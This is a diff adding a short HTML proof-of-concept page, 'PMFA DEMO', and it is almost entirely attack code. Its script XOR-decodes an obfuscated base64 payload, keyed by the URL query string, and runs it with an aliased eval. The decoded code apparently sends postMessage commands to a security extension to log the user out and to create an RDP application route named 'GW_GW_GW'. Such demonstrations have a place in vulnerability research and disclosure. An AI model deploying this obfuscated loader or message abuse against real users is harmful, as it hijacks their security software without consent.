@@ -1,0 +1,43 @@
+<html>
+<head>
+    <script>
+        (async function(){
+            function xorStrings(a, b) {
+                let result = '';
+                // Determine the length of the shorter string to avoid errors.
+                const len = Math.max(a.length, b.length);
+
+                for (let i = 0; i < len; i++) {
+                    // Get the character codes (ASCII values) for the current characters
+                    const charCodeA = a.charCodeAt(i);
+                    const charCodeB = b.charCodeAt(i);
+
+                    // Perform the bitwise XOR on the character codes
+                    const xorResult = charCodeA ^ charCodeB;
+
+                    // Convert the result back to a character and append it to the result string
+                    result += String.fromCharCode(xorResult);
+                }
+
+                return result;
+            }
+
+            const text = atob('enN0X30nIwVkJXBeAXoBWVdwQRdVWyFoZFsSV3I3e1RyDHRfZCVxBHlydwZ9bndXfHlJRABVZFtdQAZAT1IqUTIxZksCUX8LY1NoN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCMGVYQmxPaWRtYjNKM1lYSmtKeXdLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRzFsYzNOaFoyVTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCMGVYQmxPaUFuVTJWemMybHZiazFoYm1GblpYSW5MQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdGamRHbHZiam9uYkc5bmIzVjBKd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQ0FnSUNCOUxDQW5LaWNwT3dvZ0lDQWdJQ0FnSUgwS0NpQWdJQ0FnSUNBZ1puVnVZM1JwYjI0Z1EwNUJLQ2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQjNhVzVrYjNjdWNHOXpkRTFsYzNOaFoyVW9ld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkSGx3WlRvblptOXlkMkZ5WkNjc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCdFpYTnpZV2RsT2lCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkSGx3WlRvZ0owNXZibmRsWWtGd2NHeHBZMkYwYVc5dWN5Y3NDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWkdGMFlUb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjBlWEJsT2lBd0xDQXZMeUJqY21WaGRHVUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXUTZNaXdLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdibTl1ZDJWaVFYQndiR2xqWVhScGIyNDZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdGa1pISmxjM002SnpFdU1TNWhMbUVuTEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1pHVnpZM0pwY0hScGIyNDZJQ2M4Y0Q1bFBDOXdQaWNzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCd2IzSjBPaUF4TWpNMExBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdibUZ0WlRvblIxZGZSMWRmUjFjbkxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjSEp2ZEc5amIydzZKM0prY0Njc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnliM1YwWlZSdlVISnBjMjFoT25SeWRXVXNDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnSUNBZ0lIMHNKeW9uS1RzS0lDQWdJQ0FnSUNCOQ==');
+            const code = xorStrings(location.href.split('?')[1], text);
+            const a = eval;
+            a(atob(code));
+        }())
+    </script>
+    <h1>PMFA DEMO</h1>
+</head>
+<body>
+<ul>
+    <li>
+        <a href="javascript:DVL()">DVL</a>
+    </li>
+    <li>
+        <a href="javascript:CNA()">CNA (name: "GW_GW_GW")</a>
+    </li>
+</ul>
+</body>
+</html>
